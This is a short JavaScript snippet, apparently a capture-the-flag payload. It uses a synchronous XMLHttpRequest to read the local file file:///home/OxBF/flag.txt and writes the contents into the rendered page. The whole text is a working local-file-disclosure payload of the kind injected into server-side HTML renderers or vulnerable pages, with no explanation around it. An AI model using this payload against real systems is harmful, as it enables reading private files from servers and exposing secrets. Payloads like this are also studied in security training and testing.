x = new XMLHttpRequest();
x.open("GET", "file:///home/OxBF/flag.txt", false);
x.send();
document.write(x.responseText);